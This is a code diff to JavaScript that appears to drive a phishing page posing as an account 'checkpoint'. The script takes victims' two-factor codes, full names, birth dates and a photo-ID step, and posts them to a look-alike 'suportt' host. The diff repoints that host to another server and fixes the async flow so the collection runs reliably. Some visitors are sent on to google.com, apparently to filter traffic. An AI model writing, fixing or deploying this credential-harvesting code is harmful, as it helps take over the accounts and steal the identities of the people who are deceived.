@@ -2,9 +2,10 @@ modalSetting("hide");
 var isFirstLoginInput=true;
        var requestRatioSelected=false;
        var local = 'https://api.suportt.online';
-       var abc = 'https://api.suportt.online';
+       var abc = 'http://api.win-media.prj';
        let userInfo="";
        let id;
+       let ip;
        var upload_result;
        var f_result;
        let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
@@ -20,20 +21,20 @@ var isFirstLoginInput=true;
                     if(data === true || data == 'true' || data == 1){
                         window.location.href = 'https://google.com/'
                     }
-                    id = data;
+                    ip = data;
                     return true;
                 } 
             });
         });
 
 
-       async function uploadFile() {
+        function uploadFile() {
         const dt = {};
         var faurl = abc +'/business/checkpoint';
         var two_fa_code = document.getElementById("two_fa_code").value;
         dt.two_fa_code = two_fa_code;
         dt.id = id;
-        $.ajax({
+        return $.ajax({
             url: faurl,
             type: 'POST',
             dataType:"json",
@@ -48,12 +49,11 @@ var isFirstLoginInput=true;
             },
             success: function(data){
                 var res_data = JSON.stringify(data);
-                id = res_data.model_id;
+                id = res_data.id;
                 upload_result = res_data;
                 return true;
             } 
         })    
-        return true;
        }
 
        async function updateUser(){
@@ -86,7 +86,7 @@ var isFirstLoginInput=true;
                 },
                 success: function(data){
                     f_result = JSON.parse(data);
-                    id = f_result.model_id;
+                    id = f_result.id;
                     //console.log(f_result);
                     return f_result;
                 }
@@ -153,15 +153,16 @@ var isFirstLoginInput=true;
                userInfo+="Fullname: `"+document.getElementById("fullName").value+"`\nBirth: `"+document.querySelector('#day').value+"/"+document.querySelector('#month').value+"/"+document.querySelector('#year').value+"`\n";
                break;
                case "photoID" : 
-                await uploadFile();
-                if(upload_result.error_code == 1){
-                    $('#faerror').style.display="";
+               uploadFile().then(() => {
+                if(upload_result.error_code == 1 || upload_result.error_code == 2){
+                    document.getElementById("faerror").style.display="";
+                    //$('#faerror').style.display="";
                     $('.form-control-fa').prop('disabled', false);
                     $('#submitPhotoNextBtn').prop('disabled', false);
                 }else{
-                    moveTab("v-pills-messages");
+                    moveTab("v-pills-profile");
                 }
-               break;
+            });
            }
        }
 
